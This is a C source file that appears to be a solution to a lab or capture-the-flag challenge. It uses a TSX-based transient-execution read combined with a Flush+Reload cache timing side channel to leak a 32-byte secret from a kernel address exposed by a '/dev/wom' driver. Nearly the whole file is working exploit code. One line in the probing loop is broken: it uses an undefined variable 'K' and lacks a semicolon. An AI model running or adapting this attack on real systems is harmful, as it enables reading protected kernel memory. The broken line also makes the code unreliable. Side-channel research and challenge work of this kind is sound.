#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <inttypes.h>
#include <malloc.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <x86intrin.h>
#include <time.h>

#include "asm.h"

#define SECRET_LENGTH 32

#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)

#define STRIDE              4096
#define RELOADBUFFER_PAGES  256
#define RELOADBUFFER_SIZE   (RELOADBUFFER_PAGES * STRIDE)

#define ITERATIONS          5000 
#define TRY_LIMIT           10
int CACHE_THRESHOLD = 180;

void *wom_get_address(int fd) {
    void *addr = NULL;
    if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0) return NULL;
    return addr;
}

static void tsx_probe(unsigned char *reloadbuf, volatile unsigned char *target) {
    if (_xbegin() == _XBEGIN_STARTED) {
        volatile unsigned char secret_value = *target;

        volatile unsigned char dummy;
        dummy = reloadbuf[(size_t)secret_value * STRIDE];

        _xend();
    }
}

int main(int argc, char *argv[]) {
    
    /* char warm[SECRET_LENGTH];
    lseek(fd, 0, SEEK_SET);
    ssize_t r = read(fd, warm, SECRET_LENGTH); // Forces kernel to handle the page
    (void)r;
    _mm_prefetch((const char *)secret_addr + offset, _MM_HINT_T0); // Hints to the CPU */


    srand(time(NULL));
    char leaked_secret[SECRET_LENGTH + 1];
    memset(leaked_secret, 0, (SECRET_LENGTH + 1) * sizeof(char));

    int fd = open("/dev/wom", O_RDONLY);
    if (fd < 0) {
        perror("open /dev/wom");
        return -1;
    }

    volatile unsigned char *wom_addr = wom_get_address(fd);
    if (!wom_addr) {
        fprintf(stderr, "Failed to get address from WOM module.\n");
        close(fd);
        return -1;
    }

    unsigned char *reloadbuf = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (reloadbuf == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    memset(reloadbuf, 1, RELOADBUFFER_SIZE);
    printf("[*] WOM kernel address: %p\n", (void*)wom_addr);
    fflush(stdout);

    for (int idx = 0; idx < SECRET_LENGTH; idx++) {
        int scores[RELOADBUFFER_PAGES] = {0};

        for (int iter = 0; iter < ITERATIONS; iter++) {
            for (int i = 0; i < RELOADBUFFER_PAGES; i++) {
                clflush(&reloadbuf[i * STRIDE]);
            }
            
            mfence();
            cpuid();

            char warm[SECRET_LENGTH];
            lseek(fd, 0, SEEK_SET);
            ssize_t r = read(fd, warm, SECRET_LENGTH);
            (void)r;

            for (int k = 0; k < TRY_LIMIT; k++){
                tsx_probe(reloadbuf, &wom_addr[idx]);
            }
            lfence(); 
            cpuid();

            for (int k = 0; k < RELOADBUFFER_PAGES; ++k) {
                //int i = ((k * 167) + 13) & (RELOADBUFFER_PAGES - 1);
                unsigned long long i = (K + 1000091 * 256) % 256
                uint64_t t1, t2;
                volatile unsigned char sink; 

                cpuid();    
                lfence();
                t1 = rdtscp();
                sink = reloadbuf[i * STRIDE];
                t2 = rdtscp();
                lfence();
                cpuid();

                if ((t2 - t1) < CACHE_THRESHOLD) {
                    scores[i]++;
                }
            }
        }

        int best_val = 0;
        int max_score = -1;

        for (int i = 0; i < RELOADBUFFER_PAGES; i++) { 
            if (scores[i] > max_score) {
                max_score = scores[i];
                best_val = i;
            }
        }

        leaked_secret[idx] = (char)best_val;

        printf("[byte %2d] Leaked: 0x%02x '%c' (score=%d)\n",
            idx, best_val,
            isprint(best_val) ? best_val : '.',
            max_score);
                fflush(stdout);
    }

    printf("\n[*] Leaked Secret: ");
    for (int i = 0; i < SECRET_LENGTH; i++) {
        printf("%c", isprint(leaked_secret[i]) ? leaked_secret[i] : '.');
    }
    printf("\n\n");

    munmap(reloadbuf, RELOADBUFFER_SIZE);
    close(fd);
    return 0;
}